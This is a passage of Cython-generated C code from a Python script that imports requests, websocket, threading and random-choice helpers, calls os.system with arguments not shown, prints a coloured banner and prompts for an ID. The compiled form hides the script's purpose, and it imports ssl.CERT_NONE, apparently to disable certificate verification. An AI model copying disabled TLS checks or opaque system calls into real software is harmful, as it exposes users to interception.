(PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_7) < 0) __PYX_ERR(0, 12, __pyx_L4_except_error)\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n\n      \n      __pyx_t_7 = __Pyx_ImportDottedModule(__pyx_n_s_pyfiglet, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 13, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      if (PyDict_SetItem(__pyx_d, __pyx_n_s_pyfiglet, __pyx_t_7) < 0) __PYX_ERR(0, 13, __pyx_L4_except_error)\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n      goto __pyx_L3_exception_handled;\n    }\n\n    \n    __pyx_L4_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_XGIVEREF(__pyx_t_4);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_3, __pyx_t_4);\n    goto __pyx_L1_error;\n    __pyx_L3_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_XGIVEREF(__pyx_t_4);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_3, __pyx_t_4);\n    __pyx_L7_try_end:;\n  }\n\n  \n  __pyx_t_6 = PyList_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 14, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_INCREF(__pyx_n_s_system);\n  __Pyx_GIVEREF(__pyx_n_s_system);\n  if (__Pyx_PyList_SET_ITEM(__pyx_t_6, 0, __pyx_n_s_system)) __PYX_ERR(0, 14, __pyx_L1_error);\n  __Pyx_INCREF(__pyx_n_s_name_2);\n  __Pyx_GIVEREF(__pyx_n_s_name_2);\n  if (__Pyx_PyList_SET_ITEM(__pyx_t_6, 1, __pyx_n_s_name_2)) __PYX_ERR(0, 14, __pyx_L1_error);\n  __pyx_t_5 = __Pyx_Import(__pyx_n_s_os, __pyx_t_6, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 14, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_6 = __Pyx_ImportFrom(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 14, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_system, __pyx_t_6) < 0) __PYX_ERR(0, 14, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_6 = __Pyx_ImportFrom(__pyx_t_5, __pyx_n_s_name_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 14, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_name_2, __pyx_t_6) < 0) __PYX_ERR(0, 14, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n  \n  __pyx_t_5 = PyList_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 15, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_INCREF(__pyx_n_s_CERT_NONE);\n  __Pyx_GIVEREF(__pyx_n_s_CERT_NONE);\n  if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 0, __pyx_n_s_CERT_NONE)) __PYX_ERR(0, 15, __pyx_L1_error);\n  __pyx_t_6 = __Pyx_Import(__pyx_n_s_ssl, __pyx_t_5, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 15, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_6, __pyx_n_s_CERT_NONE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 15, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_CERT_NONE, __pyx_t_5) < 0) __PYX_ERR(0, 15, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n  \n  __pyx_t_6 = PyList_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 16, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_INCREF(__pyx_n_s_decompress);\n  __Pyx_GIVEREF(__pyx_n_s_decompress);\n  if (__Pyx_PyList_SET_ITEM(__pyx_t_6, 0, __pyx_n_s_decompress)) __PYX_ERR(0, 16, __pyx_L1_error);\n  __pyx_t_5 = __Pyx_Import(__pyx_n_s_gzip, __pyx_t_6, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 16, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_6 = __Pyx_ImportFrom(__pyx_t_5, __pyx_n_s_decompress); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 16, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_decompress, __pyx_t_6) < 0) __PYX_ERR(0, 16, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n  \n  __pyx_t_5 = PyList_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_INCREF(__pyx_n_s_choice);\n  __Pyx_GIVEREF(__pyx_n_s_choice);\n  if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 0, __pyx_n_s_choice)) __PYX_ERR(0, 17, __pyx_L1_error);\n  __Pyx_INCREF(__pyx_n_s_choices);\n  __Pyx_GIVEREF(__pyx_n_s_choices);\n  if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_choices)) __PYX_ERR(0, 17, __pyx_L1_error);\n  __pyx_t_6 = __Pyx_Import(__pyx_n_s_random, __pyx_t_5, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_6, __pyx_n_s_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_choice, __pyx_t_5) < 0) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_6, __pyx_n_s_choices); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_choices, __pyx_t_5) < 0) __PYX_ERR(0, 17, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n  \n  __pyx_t_6 = PyList_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 18, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_INCREF(__pyx_n_s_ThreadPoolExecutor);\n  __Pyx_GIVEREF(__pyx_n_s_ThreadPoolExecutor);\n  if (__Pyx_PyList_SET_ITEM(__pyx_t_6, 0, __pyx_n_s_ThreadPoolExecutor)) __PYX_ERR(0, 18, __pyx_L1_error);\n  __pyx_t_5 = __Pyx_Import(__pyx_n_s_concurrent_futures, __pyx_t_6, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 18, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_6 = __Pyx_ImportFrom(__pyx_t_5, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 18, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ThreadPoolExecutor, __pyx_t_6) < 0) __PYX_ERR(0, 18, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n  \n  __pyx_t_5 = PyList_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 19, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_INCREF(__pyx_n_s_dumps);\n  __Pyx_GIVEREF(__pyx_n_s_dumps);\n  if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 0, __pyx_n_s_dumps)) __PYX_ERR(0, 19, __pyx_L1_error);\n  __pyx_t_6 = __Pyx_Import(__pyx_n_s_json, __pyx_t_5, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_6, __pyx_n_s_dumps); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 19, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_dumps, __pyx_t_5) < 0) __PYX_ERR(0, 19, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_3, &__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_4);\n    __Pyx_XGOTREF(__pyx_t_3);\n    __Pyx_XGOTREF(__pyx_t_1);\n    /*try:*/ {\n\n      \n      __pyx_t_6 = PyList_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 21, __pyx_L10_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      __Pyx_INCREF(__pyx_n_s_create_connection);\n      __Pyx_GIVEREF(__pyx_n_s_create_connection);\n      if (__Pyx_PyList_SET_ITEM(__pyx_t_6, 0, __pyx_n_s_create_connection)) __PYX_ERR(0, 21, __pyx_L10_error);\n      __pyx_t_5 = __Pyx_Import(__pyx_n_s_websocket, __pyx_t_6, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 21, __pyx_L10_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __pyx_t_6 = __Pyx_ImportFrom(__pyx_t_5, __pyx_n_s_create_connection); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 21, __pyx_L10_error)\n      __Pyx_GOTREF(__pyx_t_6);\n      if (PyDict_SetItem(__pyx_d, __pyx_n_s_create_connection, __pyx_t_6) < 0) __PYX_ERR(0, 21, __pyx_L10_error)\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    goto __pyx_L15_try_end;\n    __pyx_L10_error:;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n\n    \n    /*except:*/ {\n      __Pyx_AddTraceback("ej", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_2) < 0) __PYX_ERR(0, 22, __pyx_L12_except_error)\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_6);\n      __Pyx_XGOTREF(__pyx_t_2);\n\n      \n      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_system); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 23, __pyx_L12_except_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 23, __pyx_L12_except_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n\n      \n      __pyx_t_8 = PyList_New(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 24, __pyx_L12_except_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_INCREF(__pyx_n_s_create_connection);\n      __Pyx_GIVEREF(__pyx_n_s_create_connection);\n      if (__Pyx_PyList_SET_ITEM(__pyx_t_8, 0, __pyx_n_s_create_connection)) __PYX_ERR(0, 24, __pyx_L12_except_error);\n      __pyx_t_7 = __Pyx_Import(__pyx_n_s_websocket, __pyx_t_8, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 24, __pyx_L12_except_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __pyx_t_8 = __Pyx_ImportFrom(__pyx_t_7, __pyx_n_s_create_connection); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 24, __pyx_L12_except_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      if (PyDict_SetItem(__pyx_d, __pyx_n_s_create_connection, __pyx_t_8) < 0) __PYX_ERR(0, 24, __pyx_L12_except_error)\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      goto __pyx_L11_exception_handled;\n    }\n\n    \n    __pyx_L12_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_4);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_1);\n    goto __pyx_L1_error;\n    __pyx_L11_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_4);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_1);\n    __pyx_L15_try_end:;\n  }\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Ab, __pyx_kp_u_1_92m) < 0) __PYX_ERR(0, 26, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_aB, __pyx_kp_u_1_91m) < 0) __PYX_ERR(0, 27, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_AB, __pyx_kp_u_1_96m) < 0) __PYX_ERR(0, 28, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_aBbs, __pyx_kp_u_1_93m) < 0) __PYX_ERR(0, 29, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_AbBs, __pyx_kp_u_1_95m) < 0) __PYX_ERR(0, 30, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A_bSa, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 31, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_a_bSa, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 32, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_faB_s, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 33, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_a_aB_s, __pyx_kp_u_2_39m) < 0) __PYX_ERR(0, 34, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Ba_bS, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 35, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Ya_Bs, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 36, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S_aBs, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 37, __pyx_L1_error)\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 38, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__8, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_pyfiglet); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_figlet_format); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_font, __pyx_n_u_basic) < 0) __PYX_ERR(0, 40, __pyx_L1_error)\n  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__9, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ab, __pyx_t_5) < 0) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_AbBs); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 42, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ab); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 42, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 44, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_2_36m) < 0) __PYX_ERR(0, 45, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 46, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 47, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 48, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_1_30m) < 0) __PYX_ERR(0, 49, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 50, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 51, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 52, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Bl, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 53, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_P, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 54, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 55, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_W, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 56, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PN, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 57, __pyx_L1_error)\n\n  \n  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 59, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = PyTuple_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_9 = 0;\n  __pyx_t_10 = 127;\n  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_F); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 61, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 61, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_10;\n  __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);\n  __Pyx_GIVEREF(__pyx_t_5);\n  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_5);\n  __pyx_t_5 = 0;\n  __Pyx_INCREF(__pyx_kp_u__11);\n  __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;\n  __pyx_t_9 += 6;\n  __Pyx_GIVEREF(__pyx_kp_u__11);\n  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u__11);\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_C); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 61, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 61, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_10;\n  __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);\n  __Pyx_GIVEREF(__pyx_t_6);\n  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_t_6);\n  __pyx_t_6 = 0;\n  __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_2, 3, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 61, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 61, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_id, __pyx_t_2) < 0) __PYX_ERR(0, 61, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = PyTuple_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_9 = 0;\n  __pyx_t_10 = 127;\n  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_F); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 62, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 62, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_10;\n  __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);\n  __Pyx_GIVEREF(__pyx_t_5);\n  PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_5);\n  __pyx_t_5 = 0;\n  __Pyx_INCREF(__pyx_kp_u__12);\n  __pyx_t_10 = (1114111 > __pyx_t_10) ? 1114111 : __pyx_t_10;\n  __pyx_t_9 += 9;\n  __Pyx_GIVEREF(__pyx_kp_u__12);\n  PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u__12);\n  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_C); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 62, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 62, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  __pyx_t_10 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_10) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_10;\n  __pyx_t_9 += 